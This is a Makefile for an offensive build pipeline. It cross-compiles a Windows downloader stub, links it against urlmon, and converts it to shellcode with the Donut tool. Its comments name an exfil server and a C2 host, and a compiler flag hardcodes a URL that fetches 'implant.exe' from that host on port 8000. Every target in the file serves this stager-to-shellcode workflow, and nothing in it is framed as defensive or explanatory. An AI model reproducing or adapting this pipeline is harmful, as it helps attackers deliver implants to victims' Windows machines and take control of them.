# Simplified Makefile for building Windows downloader from existing source
# Edit downloader.c directly for customization

# Host IP for the exfil server — override with: make HOST_IP=<your-ip>
# In Docker builds this is passed automatically from the C2_HOST_IP build arg.
HOST_IP ?= 192.168.1.100

# Cross-compiler settings
CC = x86_64-w64-mingw32-gcc
CFLAGS = -O2 -Wall -Wextra -static -DSERVER_URL='"http://$(HOST_IP):8000/implant.exe"'
LDFLAGS = -s
LIBS = -lurlmon -lole32 -luuid

# Target architecture for Donut (1=x86, 2=x64, 3=both)
DONUT_ARCH = 2

# File names
DOWNLOADER_SRC = loader.c
DOWNLOADER_EXE = loader.exe
SHELLCODE_BIN = loader.bin

.PHONY: all clean test check-deps help

# Default target
all: check-deps $(SHELLCODE_BIN)

# Check dependencies
check-deps:
	@which $(CC) > /dev/null || (echo "Error: mingw-w64 not found. Install with: sudo apt install gcc-mingw-w64-x86-64" && exit 1)
	@test -f ./donut || (echo "Error: donut binary not found in current directory" && exit 1)
	@test -f $(DOWNLOADER_SRC) || (echo "Error: $(DOWNLOADER_SRC) not found" && exit 1)
	@echo "✓ All dependencies found"

# Compile the Windows downloader
$(DOWNLOADER_EXE): $(DOWNLOADER_SRC)
	@echo "⚡ Cross-compiling $(DOWNLOADER_SRC) for Windows..."
	$(CC) $(CFLAGS) -o $@ $< $(LDFLAGS) $(LIBS)
	@echo "✓ Windows EXE created: $@"
	@echo "📊 Size: $$(ls -lh $@ | awk '{print $$5}')"

# Convert to shellcode using Donut  
$(SHELLCODE_BIN): $(DOWNLOADER_EXE)
	@echo "🍩 Converting to shellcode with Donut..."
	./donut -i $(DOWNLOADER_EXE) -f 1 -a $(DONUT_ARCH) -o $@
	@echo "✓ Shellcode generated: $@"
	@echo "📊 Size: $$(ls -lh $@ | awk '{print $$5}')"

# Test the Windows EXE (requires wine)
test: $(DOWNLOADER_EXE)
	@echo "🍷 Testing with wine..."
	@which wine > /dev/null || (echo "Wine not found. Install with: sudo apt install wine" && exit 1)
	wine $(DOWNLOADER_EXE)

# Show current configuration
config:
	@echo "📋 Current configuration:"
	@echo "   Source file: $(DOWNLOADER_SRC)"
	@echo "   Target arch: $(DONUT_ARCH) (1=x86, 2=x64, 3=both)"
	@echo ""
	@echo "🔧 To modify server URL and paths, edit $(DOWNLOADER_SRC)"
	@grep -n "SERVER_URL\|LOCAL_PATH" $(DOWNLOADER_SRC) 2>/dev/null || echo "   Edit the #define lines in $(DOWNLOADER_SRC)"

# Debug build with symbols
debug: CFLAGS += -g -O0
debug: LDFLAGS = 
debug: $(DOWNLOADER_EXE)
	@echo "🐛 Debug build completed (no stripping, with symbols)"

# Size-optimized build
small: CFLAGS += -Os -ffunction-sections -fdata-sections
small: LDFLAGS += -Wl,--gc-sections
small: $(DOWNLOADER_EXE)
	@echo "📦 Size-optimized build completed"

# Clean up
clean:
	rm -f $(DOWNLOADER_EXE) $(SHELLCODE_BIN)
	@echo "✓ Cleaned up generated files (kept source)"

# Install dependencies on Ubuntu/Debian
install-deps:
	@echo "📦 Installing dependencies..."
	sudo apt update
	sudo apt install gcc-mingw-w64-x86-64 wine-stable
	@echo "✓ Dependencies installed"
	@echo "ℹ️  Note: You still need to install Donut separately"

# Show help
help:
	@echo "🛠️  Available targets:"
	@echo "   all           - Build shellcode (default)"
	@echo "   test          - Test Windows EXE with wine"
	@echo "   debug         - Build with debug symbols"
	@echo "   small         - Build size-optimized version"
	@echo "   config        - Show current configuration"
	@echo "   install-deps  - Install build dependencies"
	@echo "   clean         - Remove built files"
	@echo "   help          - Show this help"
	@echo ""
	@echo "📝 To customize:"
	@echo "   1. Edit $(DOWNLOADER_SRC) to change URLs, paths, or logic"
	@echo "   2. Run 'make' to rebuild"
	@echo ""
	@echo "🎯 Architecture targets:"
	@echo "   make DONUT_ARCH=1    # x86 only"
	@echo "   make DONUT_ARCH=2    # x64 only (default)"
	@echo "   make DONUT_ARCH=3    # Universal (larger)"

# Build just the EXE without shellcode conversion
exe: $(DOWNLOADER_EXE)

# Build just the shellcode (assumes EXE exists)
shellcode: $(SHELLCODE_BIN)

# Quick rebuild (clean + build)
rebuild: clean all